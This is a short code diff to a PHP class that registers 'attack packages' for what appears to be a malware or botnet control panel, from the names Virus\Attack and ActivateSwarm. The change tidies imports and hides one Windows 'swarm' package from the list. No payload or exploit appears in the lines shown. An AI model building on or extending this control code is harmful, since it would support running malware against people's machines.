@@ -2,6 +2,8 @@
 
 namespace Kelvinho\Virus\Attack;
 
+use mysqli;
+
 /**
  * Class PackageRegistrar, Singleton
  * Oversees the attack packages. They look like scanPartitions, but their real class name with namespace will be Kelvinho\Virus\Attack\Packages\ScanPartitions
@@ -17,16 +19,17 @@ class PackageRegistrar {
 
     /**
      * PackageRegistrar constructor.
-     * @param \mysqli $mysqli
+     * @param mysqli $mysqli
      * @param string $codeRoot The code root, aka the one that will be mounted to document root
      */
-    public function __construct(\mysqli $mysqli, string $codeRoot) {
+    public function __construct(mysqli $mysqli, string $codeRoot) {
         if (!$result = $mysqli->query("select * from packageInfo")) throw new PackageInfoNotFound();
         while ($row = $result->fetch_assoc()) {
             $this->packages[$row["package_name"]] = array("className" => $row["class_name"], "displayName" => $row["display_name"], "location" => "$codeRoot/model/Attack/Packages/" . $row["location"], "description" => $row["description"]);
             array_push($this->packageNames, $row["package_name"]);
         }
         usort($this->packageNames, fn(string $x, string $y) => strcmp($this->packages[$x]["displayName"], $this->packages[$y]["displayName"]));
+        if (($key = array_search("win.oneTime.ActivateSwarm", $this->packageNames)) !== false) unset($this->packageNames[$key]);
     }
 
     /**
